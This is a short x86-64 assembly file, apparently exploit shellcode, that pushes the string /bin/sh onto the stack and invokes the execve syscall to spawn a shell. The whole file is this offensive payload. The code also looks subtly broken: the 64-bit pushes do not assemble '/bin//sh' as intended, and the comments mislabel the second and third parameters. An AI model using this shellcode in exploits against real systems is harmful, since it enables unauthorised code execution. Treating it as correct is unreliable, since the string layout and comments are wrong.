;int execve(const char *filename, char *const argv[],char *const envp[])
section .text
  global _start
    _start:
      xor rax, rax
      push rax ; push last '\0'
      xor rdx, rdx ; 0 to second param
      xor rsi, rsi ; 0 to third param
      push 0x68732f2f ; push /bin/sh
      push 0x6e69622f
      mov rdi, rsp ; first param
      mov al, 59 ; execve syscall
      syscall
